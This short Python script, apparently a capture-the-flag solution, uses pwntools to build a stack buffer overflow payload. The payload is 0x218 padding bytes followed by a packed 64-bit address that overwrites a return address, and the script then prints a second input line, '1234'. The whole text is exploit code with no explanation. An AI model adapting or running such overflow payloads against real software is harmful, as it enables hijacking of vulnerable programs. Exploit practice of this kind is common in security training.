
from pwn import *
dat  = ""
dat += "A"*0x218
dat += p64(0x600D20)

print dat+"\n"+"1234\n"

